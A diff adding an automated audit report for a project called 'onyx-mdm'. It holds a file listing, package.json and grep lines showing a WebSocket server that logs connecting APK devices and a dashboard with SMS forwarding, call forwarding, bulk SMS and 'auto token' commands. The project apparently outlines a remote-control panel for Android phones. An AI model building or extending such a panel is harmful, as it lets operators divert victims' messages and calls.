@@ -1,0 +1,85 @@
+========== PROJECT AUDIT REPORT ==========
+Date: Sat Oct 24 02:32:40 PM IST 2026
+
+
+--- 1. PROJECT STRUCTURE (Folders & Files) ---
+./audit_report.txt
+./AGENTS.md
+./README.md
+./public/window.svg
+./public/vercel.svg
+./public/globe.svg
+./public/file.svg
+./public/next.svg
+./public/crazy onxy MDM/app-debug.apk
+./public/crazy-onxy-MDM/app-debug.apk
+./.gitignore
+./package.json
+./next.config.ts
+./server.js
+./src/app/api/login/route.ts
+./src/app/page.tsx
+./src/app/login/page.tsx
+./src/app/layout.tsx
+./src/app/globals.css
+./src/middleware.ts
+./tsconfig.json
+./tailwind.config.ts
+./eslint.config.mjs
+./package-lock.json
+./.vercel/project.json
+./.vercel/README.txt
+./next-env.d.ts
+./check.sh
+
+
+--- 2. PACKAGE.JSON (Dependencies & Scripts) ---
+{
+  "name": "onyx-mdm",
+  "version": "0.1.0",
+  "private": true,
+  "scripts": {
+    "dev": "next dev",
+    "build": "next build",
+    "start": "next start",
+    "lint": "eslint"
+  },
+  "dependencies": {
+    "http-proxy": "^1.18.1",
+    "next": "16.4.2",
+    "react": "19.3.0",
+    "react-dom": "19.3.0",
+    "ws": "^8.22.0"
+  },
+  "devDependencies": {
+    "@tailwindcss/postcss": "^4.3.3",
+    "@tailwindcss/turbopack": "^4",
+    "@types/node": "^20",
+    "@types/react": "^19",
+    "@types/react-dom": "^19",
+    "eslint": "^9",
+    "eslint-config-next": "16.4.2",
+    "postcss": "^8.5.31",
+    "tailwindcss": "^4.3.3",
+    "typescript": "^5"
+  }
+}
+
+
+--- 3. ENVIRONMENT VARIABLES (Keys Only) ---
+
+
+--- 4. API ROUTES / INHOOKS (File Names) ---
+
+
+--- 5. GREP: Inhooks & Commands Logic ---
+./server.js:27:    const deviceId = urlParams.get('device_id');
+./server.js:28:    console.log(`[+] APK Connected! Device ID: ${deviceId}`);
+./server.js:31:        console.log(`[>] Received from APK ${deviceId}:`, message.toString());
+./server.js:40:        console.log(`[-] APK Disconnected: ${deviceId}`);
+./src/app/page.tsx:91:                { label: 'Bulk SMS', icon: '✉️', cmd: 'BULK_SMS' },
+./src/app/page.tsx:93:                { label: 'SMS Forward', icon: '🔄', cmd: 'SMS_FORWARD' },
+./src/app/page.tsx:94:                { label: 'Call Forward', icon: '📞', cmd: 'CALL_FORWARD' },
+./src/app/page.tsx:96:                { label: 'Auto Token', icon: '⚡', cmd: 'AUTO_TOKEN' }
+./src/app/page.tsx:128:                  <li><strong>Send/Bulk SMS:</strong> Sends SMS from device.</li>
+./src/app/page.tsx:129:                  <li><strong>SMS/Call Forward:</strong> Diverts SMS/Calls.</li>
